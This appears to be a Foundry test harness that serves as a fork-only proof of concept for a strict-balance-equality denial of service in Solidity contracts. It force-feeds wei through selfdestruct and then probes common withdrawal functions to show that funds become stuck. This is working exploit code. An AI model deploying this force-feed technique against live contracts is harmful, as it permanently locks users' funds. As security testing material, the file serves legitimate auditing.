// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Strict balance equality DoS (forced ETH breaks ==)
/// @notice Detector: strict-balance. The target requires
///         address(this).balance == EXACT. Anyone can force-feed ETH
///         (selfdestruct / coinbase) so the equality NEVER holds again,
///         permanently bricking the gated function.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh.
///
///      This harness does NOT guess a single entry point. It tries every
///      plausible withdrawal entry point for the class and accepts the first
///      that produces the class OBSERVABLE -- value is STUCK: a legitimate
///      withdrawal REVERTS while the forced ETH is still held. A call that
///      merely RETURNS moved nothing and is never treated as a reproduction.

contract Forcer {
    constructor(address payable to) payable {
        selfdestruct(to);
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// Try ONE candidate entry point and accept it only when the class
    /// OBSERVABLE changes -- never because the call returned.
    /// `before` is the target balance snapshot taken BEFORE the forced wei.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        // OBSERVABLE (strict-balance DoS): value is STUCK. The candidate
        // REVERTS while the forced wei is still sitting in the contract
        // (balance is still above the pre-feed snapshot). A call that merely
        // returned released nothing and proves nothing.
        if (!ok && target.balance > before) return label;
        return "";
    }

    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        used = _attempt(attacker, before, "withdraw()", abi.encodeWithSignature("withdraw()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "claim()", abi.encodeWithSignature("claim()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "refund()", abi.encodeWithSignature("refund()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "send()", abi.encodeWithSignature("send()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "release()", abi.encodeWithSignature("release()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "withdraw(uint256)",
            abi.encodeWithSignature("withdraw(uint256)", uint256(0))
        );
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        // The attack is not a guess: force-feed 1 wei so the strict
        // address(this).balance == EXACT check can never hold again.
        uint256 before = target.balance;
        new Forcer{value: 1 wei}(payable(target));
        assertEq(target.balance, before + 1 wei, "forced wei did not land -- cannot judge the DoS");

        // OBSERVABLE snapshot: the contract now holds the forced ETH, which a
        // legitimate withdrawal must be able to release. Reproduced = some
        // withdrawal path REVERTS with that ETH still present (value stuck).
        string memory used = _tryEntry(attackerEOA, before);

        assertTrue(
            bytes(used).length > 0,
            "not reproduced via any tried entry point. Candidates tried: withdraw(), claim(), refund(), send(), release(), withdraw(uint256) -- each either RETURNED (a no-op that released nothing) or reverted with no forced ETH held. This does NOT establish safety: the gated function may be under another name, or the balance gate may be absent at this fork block. Adapt the candidate list."
        );
        console.log("strict-balance DoS reproduced via", used, "-- forced wei bricked the gate");
    }
}
